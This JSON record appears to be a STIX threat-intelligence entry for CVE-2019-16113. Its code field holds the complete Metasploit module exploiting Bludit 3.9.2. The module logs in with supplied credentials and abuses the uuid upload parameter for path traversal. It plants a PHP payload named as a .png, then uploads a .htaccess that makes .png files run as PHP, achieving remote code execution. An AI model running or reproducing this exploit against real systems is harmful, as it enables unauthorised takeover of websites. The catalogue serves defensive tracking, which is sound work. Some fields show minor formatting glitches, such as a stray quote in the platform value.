{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--70193fdc-e281-4652-84a4-fd0159d36f07",
    "created": "2024-08-14T17:01:13.224282Z",
    "modified": "2024-08-14T17:01:13.224286Z",
    "name": "\"Bludit Directory Traversal Image File Upload Vulnerability\"",
    "description": " This module exploits a vulnerability in Bludit. A remote user could abuse the uuid parameter in the image upload feature in order to save a malicious payload anywhere onto the server, and then use a custom .htaccess file to bypass the file extension check to finally get remote code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/bludit_upload_images_exec.rb",
            "external_id": "bludit_upload_images_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-16113"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/bludit/bludit/issues/1081"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::PhpEXE\n  include Msf::Exploit::FileDropper\n  include Msf::Auxiliary::Report\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Bludit Directory Traversal Image File Upload Vulnerability\",\n      'Description'    => %q{\n        This module exploits a vulnerability in Bludit. A remote user could abuse the uuid\n        parameter in the image upload feature in order to save a malicious payload anywhere\n        onto the server, and then use a custom .htaccess file to bypass the file extension\n        check to finally get remote code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'christasa', # Original discovery\n          'sinn3r'     # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2019-16113'],\n          ['URL', 'https://github.com/bludit/bludit/issues/1081'],\n          ['URL', 'https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac' ]\n        ],\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Notes'          =>\n        {\n          'SideEffects' => [ IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability'   => [ CRASH_SAFE ]\n        },\n      'Targets'        =>\n        [\n          [ 'Bludit v3.9.2', {} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => \"2019-09-07\",\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),\n        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),\n        OptString.new('BLUDITPASS', [true, 'The password for Bludit'])\n      ])\n  end\n\n  class PhpPayload\n    attr_reader :payload\n    attr_reader :name\n\n    def initialize(p)\n      @payload = p\n      @name = \"#{Rex::Text.rand_text_alpha(10)}.png\"\n    end\n  end\n\n  class LoginBadge\n    attr_reader   :username\n    attr_reader   :password\n    attr_accessor :csrf_token\n    attr_accessor :bludit_key\n\n    def initialize(user, pass, token, key)\n      @username = user\n      @password = pass\n      @csrf_token = token\n      @bludit_key = key\n    end\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, 'index.php')\n    })\n\n    unless res\n      vprint_error('Connection timed out')\n      return CheckCode::Unknown\n    end\n\n    html = res.get_html_document\n    generator_tag = html.at('meta[@name=\"generator\"]')\n    unless generator_tag\n      vprint_error('No generator metadata tag found in HTML')\n      return CheckCode::Safe\n    end\n\n    content_attr = generator_tag.attributes['content']\n    unless content_attr\n      vprint_error(\"No content attribute found in metadata tag\")\n      return CheckCode::Safe\n    end\n\n    if content_attr.value == 'Bludit'\n      return CheckCode::Detected\n    end\n\n    CheckCode::Safe\n  end\n\n  def get_uuid(login_badge)\n    print_status('Retrieving UUID...')\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, 'admin', 'new-content', 'index.php'),\n      'cookie' => \"BLUDIT-KEY=#{login_badge.bludit_key};\"\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out')\n    end\n\n    html = res.get_html_document\n    uuid_element = html.at('input[@name=\"uuid\"]')\n    unless uuid_element\n      fail_with(Failure::Unknown, 'No UUID found in admin/new-content/')\n    end\n\n    uuid_val = uuid_element.attributes['value']\n    unless uuid_val && uuid_val.respond_to?(:value)\n      fail_with(Failure::Unknown, 'No UUID value')\n    end\n\n    uuid_val.value\n  end\n\n  def upload_file(login_badge, uuid, content, fname)\n    print_status(\"Uploading #{fname}...\")\n\n    data = Rex::MIME::Message.new\n    data.add_part(content, 'image/png', nil, \"form-data; name=\\\"images[]\\\"; filename=\\\"#{fname}\\\"\")\n    data.add_part(uuid, nil, nil, 'form-data; name=\"uuid\"')\n    data.add_part(login_badge.csrf_token, nil, nil, 'form-data; name=\"tokenCSRF\"')\n\n    res = send_request_cgi({\n      'method'  => 'POST',\n      'uri'     => normalize_uri(target_uri.path, 'admin', 'ajax', 'upload-images'),\n      'ctype'   => \"multipart/form-data; boundary=#{data.bound}\",\n      'cookie'  => \"BLUDIT-KEY=#{login_badge.bludit_key};\",\n      'headers' => {'X-Requested-With' => 'XMLHttpRequest'},\n      'data'    => data.to_s\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out')\n    end\n  end\n\n  def upload_php_payload_and_exec(login_badge)\n    # From: /var/www/html/bludit/bl-content/uploads/pages/5821e70ef1a8309cb835ccc9cec0fb35/\n    # To: /var/www/html/bludit/bl-content/tmp\n    uuid = get_uuid(login_badge)\n    php_payload = get_php_payload\n    upload_file(login_badge, '../../tmp', php_payload.payload, php_payload.name)\n\n    # On the vuln app, this line occurs first:\n    # Filesystem::mv($_FILES['images']['tmp_name'][$uuid], PATH_TMP.$filename);\n    # Even though there is a file extension check, it won't really stop us\n    # from uploading the .htaccess file.\n    htaccess = <<~HTA\n    RewriteEngine off\n    AddType application/x-httpd-php .png\n    HTA\n    upload_file(login_badge, uuid, htaccess, \".htaccess\")\n    register_file_for_cleanup('.htaccess')\n\n    print_status(\"Executing #{php_payload.name}...\")\n    send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, 'bl-content', 'tmp', php_payload.name)\n    })\n  end\n\n  def get_php_payload\n    @php_payload ||= PhpPayload.new(get_write_exec_payload(unlink_self: true))\n  end\n\n  def get_login_badge(res)\n    cookies = res.get_cookies\n    bludit_key = cookies.scan(/BLUDIT\\-KEY=(.+);/i).flatten.first || ''\n\n    html = res.get_html_document\n    csrf_element = html.at('input[@name=\"tokenCSRF\"]')\n    unless csrf_element\n      fail_with(Failure::Unknown, 'No tokenCSRF found')\n    end\n\n    csrf_val = csrf_element.attributes['value']\n    unless csrf_val && csrf_val.respond_to?(:value)\n      fail_with(Failure::Unknown, 'No tokenCSRF value')\n    end\n\n    LoginBadge.new(datastore['BLUDITUSER'], datastore['BLUDITPASS'], csrf_val.value, bludit_key)\n  end\n\n  def do_login\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, 'admin', 'index.php')\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out')\n    end\n\n    login_badge = get_login_badge(res)\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'admin', 'index.php'),\n      'cookie'    => \"BLUDIT-KEY=#{login_badge.bludit_key};\",\n      'vars_post' =>\n        {\n          'tokenCSRF' => login_badge.csrf_token,\n          'username'  => login_badge.username,\n          'password'  => login_badge.password\n        }\n    })\n\n    unless res\n      fail_with(Failure::Unknown, 'Connection timed out')\n    end\n\n    # A new csrf value is generated, need to update this for the upload\n    if res.headers['Location'].to_s.include?('/admin/dashboard')\n      store_valid_credential(user: login_badge.username, private: login_badge.password)\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri'    => normalize_uri(target_uri.path, 'admin', 'dashboard', 'index.php'),\n        'cookie' => \"BLUDIT-KEY=#{login_badge.bludit_key};\",\n      })\n\n      unless res\n        fail_with(Failure::Unknown, 'Connection timed out')\n      end\n\n      new_csrf = res.body.scan(/var tokenCSRF = \"(.+)\";/).flatten.first\n      login_badge.csrf_token = new_csrf if new_csrf\n      return login_badge\n    end\n\n    fail_with(Failure::NoAccess, 'Authentication failed')\n  end\n\n  def exploit\n    login_badge = do_login\n    print_good(\"Logged in as: #{login_badge.username}\")\n    upload_php_payload_and_exec(login_badge)\n  end\nend\n",
    "x_mitre_disclosure_date": "\"2019-09-07\"",
    "x_mitre_platforms": [
        "php'"
    ]
}